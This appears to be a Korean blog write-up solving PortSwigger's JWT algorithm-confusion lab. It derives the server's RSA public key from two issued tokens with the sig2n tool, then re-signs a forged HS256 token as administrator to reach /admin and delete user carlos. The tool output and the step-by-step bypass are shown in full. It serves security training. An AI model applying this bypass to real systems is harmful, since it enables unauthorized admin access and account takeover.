---
layout: post
title: "Burp Academy-JWT 여덞번째 문제: JWT authentication bypass via algorithm confusion with no exposed key"
categories: [보안취약점, Burp Academy]
tags: [보안취약점, Burp Academy, JWT취약점]
toc: true
last_modified_at: 2025-04-14 21:55:00 +0900
---


# 개요
- JWT(JSON Web Token) 취약점 여덞번째 문제이다. 
- 알고리즘 컨퓨전을 통한 JWT 인증우회
- JWT 취약점 설명 주소: https://portswigger.net/web-security/jwt/algorithm-confusion
- 문제 주소: https://portswigger.net/web-security/jwt/algorithm-confusion/lab-jwt-authentication-bypass-via-algorithm-confusion-with-no-exposed-key
- 난이도: EXPERT (높음)

# 취약점 설명
- 이전 문제(링크)와 마찬가지로 알고리즘 컨퓨전을 사용해 서버의 공개키를 대칭키처럼 사용(RS256)해서 서명검증을 우회하는 공격이다. 
- 이번 문제는 서버의 공개키가 주어지지 않았다는 것이 어려운 점이다. 
- 그러나 [rsa_sign2n](https://github.com/silentsignal/rsa_sign2n)을 사용하면 발행된 토큰에서 부터 공개키를 얻어내는 것이 가능한 경우가 있다. 서버측의 토큰 발행 구현 부분에 보안상 결함이 있는 경우다. 
- 자세한 원리는 아직 이해하지 못하겠지만 대충 최대공약수(Greatest Common Divisor, GCD)를 구해서 키라고 추정되는 값을 찾아주는 툴인 것 같다.  
- Portsigger사가 준비해준 Dokcer 이미지를 통해 별도의 툴 설치없이도 실행가능하다. 

```sh
docker run --rm -it portswigger/sig2n <token1> <token2>
```

- 원리를 이해하는 것을 차차해보도록 하고 일단 바로 실행해보자. 

# 문제 설명
이 랩은 세션을 처리하기 위해 JWT 기반 메커니즘을 사용한다. 서버는 서명 및 서명 확인을 위해 강력한 RSA 키 페어를 사용한다. 그러나 구현에 실수가 있기 때문에 알고리즘 컨퓨전 공격에 취약하다. 

랩을 풀려면 먼저 알려진 엔드포인트를 통해 서버의 공개키를 얻어낸다. 이 키를 사용하여 변조한 세션토큰을 서명하고, /admin 관리자 패널에 접근한 후 carlos 유저를 삭제하라.

wiener:peter 크레덴셜로 로그인할 수 있다. 

```
This lab uses a JWT-based mechanism for handling sessions. It uses a robust RSA key pair to sign and verify tokens. However, due to implementation flaws, this mechanism is vulnerable to algorithm confusion attacks.

To solve the lab, first obtain the server's public key. Use this key to sign a modified session token that gives you access to the admin panel at /admin, then delete the user carlos.

You can log in to your own account using the following credentials: wiener:peter
```

# 풀이 
## 서버의 공개키 얻어내기 
일단 주어진 크레덴셜을 이용해서 로그인을 해서 정상적인 JWT를 얻는다. 이 과정을 반복해서 JWT를 두개 얻어낸다. 

이 두개의 토큰값을 파라메터로 해서 rsa_sign2n 툴을 실행하자 다음과 같은 결과가 나왔다. 

```
Found n with multiplier 1:
    Base64 encoded x509 key: LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUFpVFBFN2ovN0l1VWl2Sy9OUzRIMQpuYnczdDBndWk3akd0WWtFMVlEYU4yaENBWVJKSDBoOURxbStwdGRBR3lzSzhheDgzZ216U2cwS2Rid1hjVHFECkdISkozNUQraytHVUhOd1hFTVZUNWF3SlZ6U2NFUTEvYS9CZTR5VWRpbGRmbzdoN214NEFBNDNkSzl0OGNVMXQKWjlOSUdrUlN1MDB2SzdZZSthUU5BRFBuQzZyZFZZV2ZLQmt1UWMwbmEzZTdBUnA2NGxwU3BCamoyL2Q1SUt3RQplYXljSHNKenpYalRiMGVlWUdrUVVFRGs1dmd2TU9Wa20wRHBvT1lzbGpYSVBQQmpMcitPRk5hWGJoaGErbGhlCnNqb1hrQ3YrZFNKMENROVRNcks1RnNqbG1KQnRhY0owd2k0SzFEWC83SEFNclovdjVJc3lxS2tZQzM3ZHpsbk0KalFJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0tCg==
    Tampered JWT: eyJraWQiOiIxOWQ3ZjI3Zi05YTE0LTQwOGUtYWFiMi1mNTExZGM2YjJhZTciLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiAicG9ydHN3aWdnZXIiLCAic3ViIjogIndpZW5lciIsICJleHAiOiAxNjc5NzMxOTYyfQ.svjaxdyy28NIWrDrCwWFisUBCoU9xKjSgxJunmO3B60
    Base64 encoded pkcs1 key: LS0tLS1CRUdJTiBSU0EgUFVCTElDIEtFWS0tLS0tCk1JSUJDZ0tDQVFFQWlUUEU3ai83SXVVaXZLL05TNEgxbmJ3M3QwZ3VpN2pHdFlrRTFZRGFOMmhDQVlSSkgwaDkKRHFtK3B0ZEFHeXNLOGF4ODNnbXpTZzBLZGJ3WGNUcURHSEpKMzVEK2srR1VITndYRU1WVDVhd0pWelNjRVExLwphL0JlNHlVZGlsZGZvN2g3bXg0QUE0M2RLOXQ4Y1UxdFo5TklHa1JTdTAwdks3WWUrYVFOQURQbkM2cmRWWVdmCktCa3VRYzBuYTNlN0FScDY0bHBTcEJqajIvZDVJS3dFZWF5Y0hzSnp6WGpUYjBlZVlHa1FVRURrNXZndk1PVmsKbTBEcG9PWXNsalhJUFBCakxyK09GTmFYYmhoYStsaGVzam9Ya0N2K2RTSjBDUTlUTXJLNUZzamxtSkJ0YWNKMAp3aTRLMURYLzdIQU1yWi92NUlzeXFLa1lDMzdkemxuTWpRSURBUUFCCi0tLS0tRU5EIFJTQSBQVUJMSUMgS0VZLS0tLS0K
    Tampered JWT: eyJraWQiOiIxOWQ3ZjI3Zi05YTE0LTQwOGUtYWFiMi1mNTExZGM2YjJhZTciLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiAicG9ydHN3aWdnZXIiLCAic3ViIjogIndpZW5lciIsICJleHAiOiAxNjc5NzMxOTYyfQ.QV2-DP5KbcVyPKU9BJV-Q2Y07Gxe9y4fq71W55qpIIk
```

이 중에서 `Base64 encoded x509 key` 또는 `Base64 encoded pkcs1 key` 가 공개키로 보인다. x509 포맷인 쪽을 사용해보자. 

## JWT 변조하기 
### JWT Editor 에서 대칭키로 등록
JWT Editor Keys 메뉴에서 New Symmetric Key 를 클릭한다.   
(위 과정에서 얻은 공개키를 대칭키로 사용하도록 하기 위해 필요한 과정이다.)

다이얼로그에서 Generate 버튼을 눌러서 새로운 키를 생성한다. `k`파라메터를 툴에서 얻어낸 'Base64 encoded x509 key' 값으로 대체하고 저장한다. 

![새로운 대칭키 생성](/images/burp-academy-jwt-8-1.png)


### alg헤더 알고리즘 변경 
Reapeater의 JSON Web Token탭에서 JWS 헤더의 알고리즘을 `RS256`에서 `HS256`로 바꾼다.


### JWT의 sub 및 HTTP 요청경로 변경
- JWS Payload의 sub를 administrator로 바꾼다. 
- HTTP요청의 경로를 /admin으로 바꾼다. 

### 재서명 
Sign 버튼을 눌러서 재서명한다. 다이얼로그에서 위의 과정에서 만든 키를 선택해서 재서명한다. 

![재서명](/images/burp-academy-jwt-8-2.png)


## 변조된 요청을 전송해서 carlos유저를 삭제 
HTTP 요청을 전송하면 200응답이 확인된다. 요청경로를 admin에서 carlos유저를 삭제하는 경로 /admin/delete?username=carlos로 변경후 다시 한번 요청을 보내면 문제 풀이에 성공했다는 메세지가 나타난다. 

![200응답확인](/images/burp-academy-jwt-8-3.png)

![풀이성공](/images/burp-academy-jwt-8-success.png)